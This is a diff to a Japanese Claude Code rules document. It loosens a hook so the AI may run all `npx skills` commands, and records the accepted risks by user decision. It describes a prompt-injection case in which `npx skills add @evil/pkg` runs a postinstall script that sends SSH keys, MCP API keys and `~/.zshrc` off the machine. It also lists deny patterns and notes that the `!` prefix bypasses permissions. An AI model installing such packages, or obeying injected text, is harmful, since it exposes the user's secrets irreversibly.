@@ -42,9 +42,25 @@ Claude Code 自身の upgrade は **ユーザーが `!` プレフィックスで
 **理由（アーキテクチャ制約）**: `settings.json` の `permissions.deny: ["Bash(npm install*)"]` は公式仕様 "deny rules always take precedence" により hook の ALLOW_PATTERNS より先に評価される。AI 経由でのホスト npm install は構造上実行不可能。`!` プレフィックスは Claude Code のパーミッションシステムをバイパスし、セッションシェルで直接コマンドを実行する唯一の方法。
 **AI が `! npm install` を自律発火することは禁止。** ユーザーの明示的な指示がある場合のみ、上記コマンドをユーザーにコピーして伝える。
 
-### npx skills (find-skills スキル) も同型
-`! npx skills find/add/check/update` も `block-host-installs.py` の DENY パターン `\bnpx\s+\S` で全 npx がブロックされる構造のため、AI 経由実行は不可能。`find-skills` スキル発動時は `! npx skills <verb> ...` の形でユーザーに**提示するのみ**。AI 自律発火禁止。
-**追加リスク**: `npx skills add` の npm `postinstall` は任意コード実行が可能なため、Prompt Injection 経由で `! npx skills add @evil/pkg` を踏むと SSH 鍵・`~/.mcp.json` (APIキー)・`~/.zshrc` が外部送信されうる。AI 経路を構造的に閉じる設計は意図的。
+### npx skills (find-skills スキル) — 全 verb AI 自律実行可 (2026-05-27 ユーザー判断で全緩和)
+
+`block-host-installs.py` の `ALLOW_PATTERNS` で **`npx skills <verb>` を全許可**。`find` / `add` / `install` / `update` / `check` / `list` 等の全 sub-command を AI が直接実行可能。
+
+**⚠️ 受容したリスク**:
+- `npx skills add <pkg>` の npm `postinstall` は **任意コード実行 (RCE)** 可能
+- Prompt Injection 経由で `npx skills add @evil/pkg` を踏むと **SSH 鍵・`~/.mcp.json` (APIキー)・`~/.zshrc` が外部送信** されうる
+- 流出は **reversible でない** (鍵入れ替え + 全 secrets ローテーション必須)
+- ユーザー判断によりこのリスクを受容 (2026-05-27)
+
+**残存ガード**:
+1. **pipe injection 防御**: `\bnpx\s+skills\s+\S` を候補別ループでのみ照合。`X && npx skills add evil` は X 単独で deny 評価
+2. **bare 拒否**: `\S` 要求で `npx skills` 単体 (verb なし) は許可しない
+3. **AI 実行前のユーザー review**: Bash ツール実行前にコマンドがユーザーに見えるため install owner/repo を確認可能
+
+**ユーザー側の自衛策**:
+- AI が `npx skills add <pkg>` を実行しようとしたら、コマンド内の `<owner>/<repo>` を信頼できるか確認
+- 不審な owner (Star 数少・github reputation 低) の場合は実行を拒否
+- 定期的に `~/.ssh/` `~/.mcp.json` `~/.zshrc` の `mtime` を監視推奨
 
 ### 参照
 
